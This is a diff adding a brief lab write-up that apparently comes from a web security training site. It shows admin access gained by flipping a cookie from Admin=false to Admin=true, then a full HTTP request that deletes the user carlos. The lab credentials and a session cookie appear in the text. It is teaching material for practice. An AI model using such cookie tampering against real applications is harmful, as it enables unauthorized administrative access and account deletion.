@@ -1,0 +1,15 @@
+Some applications determine the user's access rights or role at login, and then store this information in a user-controllable location, such as a hidden field, cookie, or preset query string parameter. The application makes subsequent access control decisions based on the submitted value. For example:
+
+This lab has an admin panel at /admin, which identifies administrators using a forgeable cookie.
+
+Solve the lab by accessing the admin panel and using it to delete the user carlos.
+
+You can log in to your own account using the following credentials: wiener:peter
+
+In attempt to go to the admin panel, I noticed the cookie stated
+Cookie:Admin=false
+from here I changed it to true, got access to the admin panel, and deleted carlos user with the following request:
+
+GET /admin/delete?username=carlos HTTP/1.1
+Host: ac441fe11fe2d9fdc0e319c4000200a1.web-security-academy.net
+Cookie: Admin=true; session=zVG2goQ6UL1qcP875suYZjAjP2t89mvG
